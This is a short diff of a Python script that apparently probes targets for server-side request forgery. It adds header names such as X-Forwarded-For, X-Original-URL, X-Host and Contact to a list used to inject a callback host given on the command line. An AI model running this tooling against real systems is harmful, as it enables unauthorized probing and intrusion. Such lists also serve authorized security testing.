@@ -8,7 +8,7 @@ from requests.packages import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 S = 10
-list = ["X-Custom-IP-Authorization", "X-Custom-IP-Authorization", "X-Original-URL", "X-Rewrite-URL", "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host", "Referrer"]
+list = ["Cf-Connecting_ip", "X-Real-Ip", "From", "X-Wap-Profile", "Contact", "X-HTTP-Host-Override", "X-Custom-IP-Authorization", "X-Custom-IP-Authorization", "X-Original-URL", "X-Rewrite-URL", "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host", "Referrer"]
 def main():
     target = sys.argv[1]
     ssrf_baby = sys.argv[2]
